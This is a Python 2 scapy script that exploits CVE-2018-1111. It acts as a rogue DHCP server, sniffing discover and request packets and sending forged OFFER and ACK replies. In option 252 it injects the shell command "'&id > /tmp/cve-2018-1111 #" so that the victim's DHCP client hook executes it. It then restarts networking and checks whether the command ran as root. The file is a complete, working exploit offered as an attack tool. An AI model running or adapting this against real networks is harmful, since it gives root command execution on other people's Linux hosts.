# -*- coding: utf-8 -*-
from scapy.all import *
import sys
import commands
import re
import time
from multiprocessing import Process, Queue


def putColor(text, color):
    colors = {'red': 31, 'green': 32, 'yellow': 33}
    return "\033[1m\033[%sm%s\033[0m" % (colors[color], text)


def getIface():
    print '[+]get interface:',
    if len(sys.argv) == 2:
        iface = [sys.argv[1]]
    else:
        iface = re.findall('^([\S].+): ', commands.getoutput('ifconfig'))
    if not iface:
        print putColor('X\n  [-]get interface failed!\n  [-]You should assign it.', 'red')
        sys.exit(1)

    print putColor('√', 'green')
    return iface[0]


def checkEnv():
    print '[*]check environment'
    print '[+]check for %s:' % putColor("/etc/init.d/network", 'green'),
    status, output = commands.getstatusoutput("sudo /etc/init.d/network status")
    if status:
        NetWork = 0
        print putColor(
            "X\n  [-]It's seems you don't have the command: /etc/init.d/network\n  [-]You need to reconnect to the network by yourself.", 'red')
    else:
        print putColor('√', 'green')
        NetWork = 1

    print '[+]check for %s:' % putColor("ifconfig", 'green'),
    status, output = commands.getstatusoutput("ifconfig")
    if status:
        print putColor(
            "X\n  [-]It's seems you don't have the command: ifconfig\n  [-]You should install it", 'red'
        )
        sys.exit(1)
    else:
        print putColor('√', 'green')

    return [getIface(), NetWork]


def Clear():
    print "[!]rm the temp file"
    commands.getoutput('sudo rm /tmp/cve-2018-1111')
    print '[+]Done'


def checkACK():
    global Try, que

    output = commands.getoutput("ifconfig")
    inet = re.findall("inet (%s)" % '\.'.join(["[0-9]+"]*4), output)
    if '111.111.111.100' not in inet:
        if not Try:
            sys.exit(putColor("[X]Distribute IP failed", 'red'))
        Try -= 1
        print putColor('  [!]Try again', 'yellow')
        que.put(1)
        return 0

    time.sleep(1)
    if 'cve-2018-1111' in commands.getoutput('ls /tmp'):
        with open('/tmp/cve-2018-1111', 'r') as fp:
            if 'root' in fp.read():
                print putColor('\n[!]Exploit as root successfully', 'green')
            else:
                print putColor('\n[!]Exploit successfully, but not as root', 'yellow')
            Clear()
    else:
        print putColor('\n[!]Exploit failed', 'red')
    return 1


def sendPackage(type, pkt):
    global iface
    sendp(Ether(
        dst="00:0c:29:a9:26:d5", src="00:50:56:e4:00:3a"
    )/IP(
        ihl=5, tos=0x10, id=0, ttl=16, src='111.111.111.110', dst='111.111.111.100'
    )/UDP(
        sport='bootps', dport='bootpc',
    )/BOOTP(
        op='BOOTREPLY', xid=pkt.xid, yiaddr='111.111.111.100', siaddr='111.111.111.110',
        chaddr=pkt.chaddr,
        sname='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        file='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', options='c\x82Sc'
    )/DHCP(options=[
        ("message-type", type), ("server_id", "111.111.111.110"),
        ("lease_time", 1800), ("subnet_mask", "255.255.255.0"),
        ("broadcast_address", "111.111.111.111"), ("domain", "localomain"),
        (252, "'&id > /tmp/cve-2018-1111 #"),
        ("name_server", "192.168.172.2"), ("router", "192.168.172.2"), "end"]
    ), verbose=False, iface=iface)


def Collector(pkt):
    options = pkt.sprintf("{DHCP:%DHCP.options%\n}")

    if "discover" in options:
        print putColor("  [-]Found Discover, offer it", 'green')
        sendPackage(2, pkt)

    elif 'request' in options:
        print putColor('  [-]Found Request, ack it', 'green')
        sendPackage(5, pkt)
        time.sleep(2)
        if checkACK():
            sys.exit("\n[*]All Done")


def Network_restart():
    global que, NetWork
    while 1:
        que.get()
        time.sleep(1)
        print '  [-]Restarting Network'
        if NetWork:
            result = commands.getoutput('sudo /etc/init.d/network restart')
            if 'error' in result:
                sys.exit(putColor('[X]%s' % result), 'red')
        else:
            print putColor('  [!]Please reconnect network', 'yellow')


def Sniffer():
    global que
    que.put(1)
    print '[+]Sniffing'
    print '  [-]Using iface: %s\n' % putColor(iface, 'green')
    try:
        sniff(iface=iface,
              prn=Collector,
              filter='udp port 67',
              store=0)
    except Exception, e:
        if 'permitted' in str(e):
            print putColor('[X]Run as root', 'red')
        else:
            print e


Try = 5
iface, NetWork = checkEnv()
print '[+]Done'

print '\n[*]Exploit'

que = Queue()
S = Process(target=Sniffer)
NR = Process(target=Network_restart)
S.start()
NR.start()

S.join()
NR.terminate()
